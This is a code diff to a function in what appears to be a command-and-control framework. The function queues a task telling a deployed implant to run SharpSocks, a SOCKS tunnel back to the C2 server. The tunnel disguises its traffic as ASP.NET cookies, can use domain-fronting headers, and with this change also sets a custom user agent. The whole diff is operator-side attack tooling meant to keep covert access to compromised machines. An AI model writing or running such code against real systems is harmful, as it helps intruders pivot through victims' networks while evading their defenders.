@@ -237,20 +237,21 @@ def do_sharpsocks(user, command, randomuri):
     sharpkey = gen_key().decode("utf-8")
     sharpurls = get_sharpurls()
     sharpurls = sharpurls.split(",")
-    sharpurl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
+    sharpurl = select_item("PayloadCommsHost", "C2Server").replace('"', '').split(',')[0]
+    user_agent = select_item("UserAgent", "C2Server")
     dfheader = get_first_dfheader(select_item("DomainFrontHeader", "C2Server"))
     print("sharpsocks -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN)
     ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
     if ri == "":
         if dfheader:
-            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken -df %s" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), dfheader), user, randomuri)
+            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken -df %s --user-agent \"%s\"" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), dfheader, user_agent), user, randomuri)
         else:
-            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
+            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken  --user-agent \"%s\"" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), user_agent), user, randomuri)
     if ri.lower() == "y":
         if dfheader:
-            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken -df %s" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), dfheader), user, randomuri)
+            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken -df %s  --user-agent \"%s\"" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), dfheader, user_agent), user, randomuri)
         else:
-            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
+            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken  --user-agent \"%s\"" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), user_agent), user, randomuri)
     print("SharpSocks task issued, to stop SharpSocks run stopsocks")
 
 
